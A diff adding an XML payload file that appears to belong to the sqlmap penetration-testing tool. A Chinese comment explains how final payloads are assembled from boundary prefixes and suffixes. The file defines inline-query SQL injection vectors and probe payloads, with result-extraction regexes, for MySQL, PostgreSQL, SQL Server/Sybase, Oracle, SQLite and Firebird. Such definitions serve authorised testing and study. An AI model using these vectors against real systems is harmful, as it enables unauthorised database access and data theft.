@@ -1,0 +1,133 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+参考文章：http://www.cnblogs.com/hongfei/p/sqlmap-error-based-blind.html
+当且仅当某个boundary元素的where节点的值包含test元素的子节点，
+clause节点的值包含test元素的子节点的时候，该boundary才能和当前的test匹配，从而进一步生成payload。
+
+最终的payload是根据test的payload子节点和boundary的prefix（前缀）、suffix（后缀）子节点的值组合而成的，即：
+最终的payload =  url参数 + boundary.prefix+test.payload+boundary.suffix
+将其中的[RANDNUM]、[DELIMITER_START]、[DELIMITER_STOP]替换掉之后
+-->
+<root>
+    <!-- Inline queries tests -->
+    <test>
+        <title>MySQL inline queries</title>
+        <stype>3</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+            <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+            -->
+            <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL inline queries</title>
+        <stype>3</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase inline queries</title>
+        <stype>3</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle inline queries</title>
+        <stype>3</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT ('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]') FROM DUAL)</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]' FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'</vector>
+        <request>
+            <payload>SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))||'[DELIMITER_STOP]'</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' FROM RDB$DATABASE</vector>
+        <request>
+            <payload>SELECT '[DELIMITER_START]'||(CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' FROM RDB$DATABASE</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+        </details>
+    </test>
+    <!-- End of inline queries tests -->
+</root>
